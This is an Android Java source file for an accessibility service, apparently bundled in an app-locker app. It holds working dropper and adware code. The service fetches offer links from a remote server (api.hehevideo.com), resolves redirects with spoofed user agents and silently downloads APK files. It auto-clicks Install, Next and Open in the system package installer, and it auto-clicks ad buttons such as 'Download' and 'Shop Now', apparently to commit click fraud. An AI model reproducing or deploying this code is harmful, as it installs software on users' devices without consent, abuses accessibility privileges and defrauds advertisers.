package com.noahapp.accesslib;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.support.annotation.RequiresApi;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.amigo.applocker.BuildConfig;
import com.android.volley.RequestQueue;
import com.android.volley.Response.ErrorListener;
import com.android.volley.Response.Listener;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.noahapp.accesslib.activity.InterstitalActivity;
import com.noahapp.accesslib.download.DownloadFile;
import com.noahapp.accesslib.download.DownloadFileCompleteReceiver;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

//import com.facebook.ads.InterstitialAd;
//import com.google.android.gms.common.zze;

@RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
public class BaseAccessibilityService2 extends AccessibilityService {
    private static final String AUTO_INSTALL_TEXT_INSTALL = "Install";
    private static final String AUTO_INSTALL_TEXT_NEXT = "Next";
    private static final String AUTO_INSTALL_TEXT_OPEN = "Open";
    private static final String TEXT_ACCEPT = "ACCEPT";
    private static final String TEXT_INSTALL = "INSTALL";
    private boolean getOfferSuccess = false;
    private boolean hasEditView = false;
    private boolean hasFindAccept = false;
    private boolean hasFindInstall = false;
    //    private InterstitialAd interstitialAd;
    private long last_refresh_time = 0;
    private long last_request_time = 0;
    private long last_start_downloading_time = 0;
    private long last_start_fbad_time = 0;
    private RequestQueue mQueue;

    public class RealLinkAsyncTask extends AsyncTask<String, String, String> {
        private Context mContext;
        private String mOriginalLink;
        private String mPackName;
        private String mUserAgent = getUserAgent();

        public RealLinkAsyncTask(Context ctx, String packname, String original) {
            this.mOriginalLink = original;
            this.mPackName = packname;
            this.mContext = ctx;
        }

        private String getUserAgent() {
            String userAgent = PreferenceFile.getInstance(this.mContext).getUserAgent();
            if (TextUtils.isEmpty(userAgent)) {
                return (String) Arrays.asList(UAConsts.UA_ANDROIDS).get(new Random().nextInt(15));
            }
            BaseAccessibilityService2.this.trackAction("userAgent=" + userAgent);
            return userAgent;
        }

        protected String doInBackground(String... params) {
            String gpLink = BaseAccessibilityService2.this.GetGPLink(this.mOriginalLink, this.mUserAgent);
            return (TextUtils.isEmpty(gpLink) || !(gpLink.startsWith("https://play.google.com/") || gpLink.contains("" +
                    ".apk"))) ? "" : gpLink;
        }

        protected void onPostExecute(String link) {
            if (!TextUtils.isEmpty(link)) {
                if (link.startsWith("https://play.google.com/")) {
                    DP.E("jump_gplink==" + link);
                    BaseAccessibilityService2.this.trackAction("jump_gplink=" + link);
                    PreferenceFile.getInstance(BaseAccessibilityService2.this.getApplicationContext()).saveNowLink
                            (link);
                    PreferenceFile.getInstance(BaseAccessibilityService2.this.getApplicationContext())
                            .saveNowPackName(this.mPackName);
                    BaseAccessibilityService2.this.JumpLink(link);
                    return;
                }
                DP.E("start silent download ==" + link);
                BaseAccessibilityService2.this.trackAction("start_silent_download=" + link);
                PreferenceFile.getInstance(BaseAccessibilityService2.this.getApplicationContext()).saveNowDDL(link);
                PreferenceFile.getInstance(BaseAccessibilityService2.this.getApplicationContext()).saveNowDDLPackName
                        (this.mPackName);
                BaseAccessibilityService2.this.downLoadFile(this.mPackName, link);
            }
        }
    }

    private void loadMyInterstitial() {
        Intent notityIntent = new Intent(getApplicationContext(), InterstitalActivity.class);
        notityIntent.setFlags(268435456);
        startActivity(notityIntent);
    }

    private void loadInterstitialAd() {
        DP.toast(getApplicationContext(), "interstitialAd start..");
        loadMyInterstitial();
    }

    protected void onServiceConnected() {
        registerReceiver(new DownloadFileCompleteReceiver(), new IntentFilter("android.intent.action" +
                ".DOWNLOAD_COMPLETE"));
    }

    private void requestForLink(String keyword) {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        if (System.currentTimeMillis() - this.last_request_time >= 600000) {
            this.last_request_time = System.currentTimeMillis();
            String last_pack_name = PreferenceFile.getInstance(getApplicationContext()).getNowPackName();
            String last_link = PreferenceFile.getInstance(getApplicationContext()).getNowLink();
            if (TextUtils.isEmpty(last_pack_name) || checkApkExist(last_pack_name)) {
                trackAction("request_" + keyword);
                this.mQueue.add(new JsonArrayRequest("http://api.hehevideo.com/offerlist/" + keyword, new
                        Listener<JSONArray>() {
                    public void onResponse(JSONArray response) {
                        try {
                            int length = response.length();
                            for (int i = 0; i < length; i++) {
                                JSONObject jsonObject = response.getJSONObject(i);
                                String link = jsonObject.getString("link");
                                if (!TextUtils.isEmpty(link)) {
                                    String packageName = jsonObject.getString("packname");
                                    if (TextUtils.isEmpty(packageName)) {
                                        BaseAccessibilityService2.this.JumpBrowser(link);
                                        BaseAccessibilityService2.this.trackAction("jump_order_me=" + link);
                                    } else if (BaseAccessibilityService2.this.checkApkExist(packageName)) {
                                        DP.E("package_exist");
                                        BaseAccessibilityService2.this.trackAction("package_exist");
                                    } else {
                                        BaseAccessibilityService2.this.trackAction("original_link=" + link);
                                        new RealLinkAsyncTask(BaseAccessibilityService2.this.getApplication(),
                                                packageName, link).execute(new String[0]);
                                        return;
                                    }
                                }
                                DP.E("link:" + link);
                            }
                        } catch (Exception e) {
                            DP.E("error=" + e.toString());
                            e.printStackTrace();
                        }
                    }
                }, new ErrorListener() {
                    public void onErrorResponse(VolleyError error) {
                    }
                }));
                return;
            }
            DP.E("jump_cache_link:" + last_link);
            trackAction("jump_cache_link" + last_link);
            JumpLink(last_link);
        }
    }

    private void requestForApk(String keyword) {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        String last_pack_name = PreferenceFile.getInstance(getApplicationContext()).getNowDDLPackName();
        String last_link = PreferenceFile.getInstance(getApplicationContext()).getNowDDL();
        if (TextUtils.isEmpty(last_pack_name) || checkApkExist(last_pack_name)) {
            trackAction("request_" + keyword);
            DP.E("request_" + keyword);
            this.mQueue.add(new JsonArrayRequest("http://api.hehevideo.com/offerlist/" + keyword, new
                    Listener<JSONArray>() {
                public void onResponse(JSONArray response) {
                    try {
                        int length = response.length();
                        for (int i = 0; i < length; i++) {
                            JSONObject jsonObject = response.getJSONObject(i);
                            String link = jsonObject.getString("link");
                            if (TextUtils.isEmpty(link)) {
                                BaseAccessibilityService2.this.trackAction("link_null");
                            } else {
                                String packageName = jsonObject.getString("packname");
                                if (TextUtils.isEmpty(packageName)) {
                                    BaseAccessibilityService2.this.JumpBrowser(link);
                                    BaseAccessibilityService2.this.trackAction("jump_order_me=" + link);
                                    return;
                                } else if (BaseAccessibilityService2.this.checkApkExist(packageName)) {
                                    DP.E("package_exist");
                                    BaseAccessibilityService2.this.trackAction("download_apk_exist:" + packageName);
                                } else {
                                    BaseAccessibilityService2.this.trackAction("download_orignial=" + link);
                                    new RealLinkAsyncTask(BaseAccessibilityService2.this.getApplication(),
                                            packageName, link).execute(new String[0]);
                                    return;
                                }
                            }
                            DP.E("link:" + link);
                        }
                    } catch (Exception e) {
                        DP.E("error=" + e.toString());
                        e.printStackTrace();
                    }
                }
            }, new ErrorListener() {
                public void onErrorResponse(VolleyError error) {
                }
            }));
            return;
        }
        DP.E("ddl_cache_link:" + last_link);
        trackAction("ddl_cache_link" + last_link);
        downLoadFile(last_pack_name, last_link);
    }

    private void requestForConfig() {
        if (this.mQueue == null) {
            this.mQueue = Volley.newRequestQueue(getApplicationContext());
        }
        trackAction("request_config");
        this.mQueue.add(new JsonObjectRequest("http://api.hehevideo.com/config.json", null, new Listener<JSONObject>() {
            public void onResponse(JSONObject response) {
                try {
                    PreferenceFile.getInstance(BaseAccessibilityService2.this.getApplicationContext())
                            .saveConfigFBInterval(response.getInt("fb_interval"));
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }, null));
    }

    private void trackAction(String order) {
        TrackManager.getInstance(getApplicationContext()).trackAction(order);
    }

    public boolean checkApkExist(String packageName) {
        if (TextUtils.isEmpty(packageName)) {
            return false;
        }
        try {
            ApplicationInfo info = getPackageManager().getApplicationInfo(packageName, PackageManager
                    .GET_UNINSTALLED_PACKAGES);
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (VERSION.SDK_INT >= 15) {
            checkInstall(event);
            int eventType = event.getEventType();
            if (eventType != 2048) {
                DP.E("eventType:" + eventType);
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    String rootPackName = rootNode.getPackageName().toString();
                    DP.E("package=" + rootPackName);
                    switch (eventType) {
                        case AccessibilityEvent.TYPE_VIEW_CLICKED:
                            return;
                        case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                findEditText(rootNode);
//                                return;
//                            }
                            return;
                        case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                if (this.hasFindInstall && findAndPerformActionButton(rootNode, TEXT_ACCEPT)) {
//                                    this.hasFindInstall = false;
//                                    this.hasFindAccept = true;
//                                    return;
//                                }
//                                return;
//                            } else
                            if (rootNode.getPackageName().equals("com.android.chrome")
                                    || rootNode.getPackageName().equals("com.UCMobile.intl")
                                    || rootNode.getPackageName().equals("com.uc.browser.en")
                                    || rootNode.getPackageName().equals("com.opera.mini.native")
                                    || rootNode.getPackageName().equals("com.opera.browser")
                                    || rootNode.getPackageName().equals("org.mozilla.firefox")
                                    || rootNode.getPackageName().equals("com.ksmobile.cb")
                                    || rootNode.getPackageName().equals("com.android.browser")
                                    || rootNode.getPackageName().equals("com.UCMobile")) {
                                if (!this.getOfferSuccess && PreferenceFile.getInstance(this).shouldSubscribe()) {
//                                    requestForLink("order_browser");
                                    return;
                                }
                                return;
                            } else if (rootPackName.equals("com.android.settings")
                                    || rootPackName.equals("com.android.systemui")
                                    || rootPackName.equals("com.android.packageinstaller")
                                    || rootPackName.contains("launcher")
                                    || rootPackName.equals(BuildConfig.APPLICATION_ID)) {
                                if (rootPackName.equals(BuildConfig.APPLICATION_ID)) {
                                    simulateFbClick(rootNode);
                                    return;
                                }
                                return;
                            } else if (PreferenceFile.getInstance(getApplicationContext()).shoulddownload()) {
                                DP.E("request_for_apk");
                                requestForApk("order_apk");
                                return;
                            } else {
                                return;
                            }
                        case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                if (this.hasFindAccept) {
//                                    performGlobalAction(1);
//                                    performGlobalAction(1);
//                                    trackAction("simulate_back");
//                                    DP.E("simulate_back");
//                                    this.hasFindAccept = false;
//                                    return;
//                                }
//                                return;
//                            } else
                            if (rootNode.getPackageName().equals(BuildConfig.APPLICATION_ID)) {
                                simulateFbClick(rootNode);
                                return;
                            } else {
                                return;
                            }
                        case AccessibilityEvent.TYPE_VIEW_SCROLLED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)
//                                    && this.getOfferSuccess
//                                    && findAndPerformActionButton(rootNode, TEXT_INSTALL)) {
//                                trackAction("-------------finded_install_button------------");
//                                this.hasFindInstall = true;
//                                this.getOfferSuccess = false;
//                                return;
//                            }
                            return;
                        case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
//                            if (rootNode.getPackageName().equals(zze.GOOGLE_PLAY_STORE_PACKAGE)) {
//                                this.hasEditView = false;
//                                findText(rootNode);
//                                return;
//                            }
                            return;
                        default:
                            return;
                    }
                }
            }
        }
    }

    protected void reCheckClickEvent(AccessibilityEvent event, String[] list) {
        if (System.currentTimeMillis() - this.last_refresh_time > 1800000) {
            requestForConfig();
            this.last_refresh_time = System.currentTimeMillis();
        }
        if (System.currentTimeMillis() - this.last_start_fbad_time > ((long) ((PreferenceFile.getInstance
                (getApplication()).getConfigFBInterval() * 1000) * 60))) {
            boolean shouldBlocked = false;
            String rootPackName = event.getPackageName().toString();
            if (event.getEventType() == 1 && !rootPackName.equals(BuildConfig.APPLICATION_ID)
//                    && !rootPackName.equals(zze.GOOGLE_PLAY_STORE_PACKAGE)
                    && !rootPackName.equals("com.android.settings")
                    && !rootPackName.equals("com.android.systemui")
                    && !rootPackName.equals("com.android.packageinstaller")
                    && !rootPackName.contains("launcher")) {
                for (String equals : list) {
                    if (equals.equals(rootPackName)) {
                        shouldBlocked = true;
                        break;
                    }
                }
                // 此处广告ad，删除之
//                if (!shouldBlocked) {
//                    loadInterstitialAd();
//                    this.last_start_fbad_time = System.currentTimeMillis();
//                }
            }
        }
    }

    private boolean findAndPerformActionButton(AccessibilityNodeInfo rootNode, String text) {
        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
        int i = 0;
        while (i < nodes.size()) {
            AccessibilityNodeInfo node = (AccessibilityNodeInfo) nodes.get(i);
            if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                node.performAction(16);
                return true;
            } else if (node.getClassName().equals("android.widget.TextView") && node.isEnabled()) {
                node.performAction(16);
                return true;
            } else {
                i++;
            }
        }
        return false;
    }

    private void simulateFbClick(AccessibilityNodeInfo rootNode) {
        String last_install_packname = PreferenceFile.getInstance(getApplication()).getLastInstallPackName();
        String last_interstitial_time = PreferenceFile.getInstance(getApplication()).getLastInterstitialTimeStamp();
        if (!TextUtils.isEmpty(last_install_packname) || !TextUtils.isEmpty(last_interstitial_time)) {
            if (findAndPerformActionButton(rootNode, "Download")) {
                DP.E("fb_click_download");
                trackAction("fb_click_download");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Learn More")) {
                DP.E("fb_click_learnmore");
                trackAction("fb_click_learnmore");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Open Link")) {
                DP.E("fb_click_openlink");
                trackAction("fb_click_openlink");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Shop Now")) {
                DP.E("fb_click_shopnow");
                trackAction("fb_click_shopnow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Book Now")) {
                DP.E("fb_click_booknow");
                trackAction("fb_click_booknow");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Sign Up")) {
                DP.E("fb_click_signup");
                trackAction("fb_click_signup");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            } else if (findAndPerformActionButton(rootNode, "Watch More")) {
                DP.E("fb_click_watchmore");
                trackAction("fb_click_watchmore");
                PreferenceFile.getInstance(getApplication()).saveLastInstallPackName("");
                PreferenceFile.getInstance(getApplication()).saveLastInterstitialTimeStamp("");
            }
        }
    }

    private boolean findText(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) {
            return false;
        }
        int count = rootNode.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo nodeInfo = rootNode.getChild(i);
            if (nodeInfo != null) {
                if ("android.widget.EditText".equals(nodeInfo.getClassName())) {
                    this.hasEditView = true;
                }
                if ("android.widget.TextView".equals(nodeInfo.getClassName()) && !TextUtils.isEmpty(nodeInfo.getText
                        ())) {
                    String keyword = nodeInfo.getText().toString();
                    if (!TextUtils.isEmpty(keyword) && this.hasEditView) {
                        DP.E("==================send_text_request:" + keyword);
//                        requestForLink("text=" + keyword);
                        this.hasEditView = false;
                        return true;
                    }
                }
                if (findText(nodeInfo)) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean findEditText(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) {
            return false;
        }
        int count = rootNode.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo nodeInfo = rootNode.getChild(i);
            if (nodeInfo != null) {
                if ("android.widget.EditText".equals(nodeInfo.getClassName())) {
                    String keyword = nodeInfo.getText().toString();
                    if (!TextUtils.isEmpty(keyword)) {
                        DP.E("==================send_edit_request:" + keyword);
//                        requestForLink("edit=" + keyword);
                        return true;
                    }
                }
                if (findEditText(nodeInfo)) {
                    return true;
                }
            }
        }
        return false;
    }

    private void JumpLink(String link) {
        // 跳转谷歌商店
        this.getOfferSuccess = true;
//        Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(link));
//        browserIntent.setClassName(zze.GOOGLE_PLAY_STORE_PACKAGE, "com.android.vending.AssetBrowserActivity");
//        browserIntent.setFlags(268435456);
//        startActivity(browserIntent);
        this.last_start_downloading_time = System.currentTimeMillis();
    }

    private void JumpBrowser(String link) {
        this.getOfferSuccess = true;
        Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(link));
        intent.setFlags(268435456);
        startActivity(intent);
        this.last_start_downloading_time = System.currentTimeMillis();
    }

    public void onInterrupt() {
    }

    private String GetGPLink(String url, String userAgent) {
        if (url.startsWith("https://play.google.com/")) {
            return url;
        }
        String location = "";
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setInstanceFollowRedirects(false);
            conn.addRequestProperty("Accept-Charset", "UTF-8;");
            conn.addRequestProperty("User-Agent", userAgent);
            conn.connect();
            location = conn.getHeaderField("Location");
            if (location.startsWith("market://details?id=")) {
                return location.replace("market://details?id=", "https://play.google.com/store/apps/details?id=");
            }
            if (location.contains(".apk")) {
                return location;
            }
            conn = (HttpURLConnection) new URL(location).openConnection();
            conn.setRequestMethod("GET");
            conn.addRequestProperty("Accept-Charset", "UTF-8;");
            conn.addRequestProperty("User-Agent", userAgent);
            conn.connect();
            if (location.startsWith("https://play.google.com/")) {
                return location;
            }
            return GetGPLink(location, userAgent);
        } catch (Exception ex) {
            DP.E("error:" + ex.toString());
            return location;
        }
    }

    private void downLoadFile(String name, String link) {
        DownloadFile.downloadFile(getApplicationContext(), link, name);
    }

    private boolean checkTitle(AccessibilityNodeInfo source, String title) {
        for (AccessibilityNodeInfo node : source.findAccessibilityNodeInfosByText(title)) {
            if (node.getClassName().equals("android.widget.TextView")) {
                return true;
            }
        }
        return false;
    }

    private void checkInstall(AccessibilityEvent event) {
        boolean notNull;
        boolean installPage = false;
        if (event.getSource() != null) {
            notNull = true;
        } else {
            notNull = false;
        }
        if (notNull) {
            if (event.getPackageName().equals("com.android.packageinstaller") || event.getPackageName().equals("com" +
                    ".google.android.packageinstaller")) {
                installPage = true;
            }
            if (installPage) {
                doInstall(event);
            }
        }
    }

    private void doInstall(AccessibilityEvent event) {
        int i;
        AccessibilityNodeInfo node;
        List<AccessibilityNodeInfo> unintall_nodes = event.getSource().findAccessibilityNodeInfosByText
                (AUTO_INSTALL_TEXT_INSTALL);
        if (!(unintall_nodes == null || unintall_nodes.isEmpty())) {
            for (i = 0; i < unintall_nodes.size(); i++) {
                node = (AccessibilityNodeInfo) unintall_nodes.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(16);
                    performGlobalAction(1);
                    performGlobalAction(2);
                    trackAction("ddl_install_and_startapp");
                }
            }
        }
        List<AccessibilityNodeInfo> next_nodes = event.getSource().findAccessibilityNodeInfosByText
                (AUTO_INSTALL_TEXT_NEXT);
        if (!(next_nodes == null || next_nodes.isEmpty())) {
            for (i = 0; i < next_nodes.size(); i++) {
                node = (AccessibilityNodeInfo) next_nodes.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(16);
                }
            }
        }
        List<AccessibilityNodeInfo> ok_nodes = event.getSource().findAccessibilityNodeInfosByText
                (AUTO_INSTALL_TEXT_OPEN);
        if (ok_nodes != null && !ok_nodes.isEmpty()) {
            for (i = 0; i < ok_nodes.size(); i++) {
                node = (AccessibilityNodeInfo) ok_nodes.get(i);
                if (node.getClassName().equals("android.widget.Button") && node.isEnabled()) {
                    node.performAction(16);
                }
            }
        }
    }
}
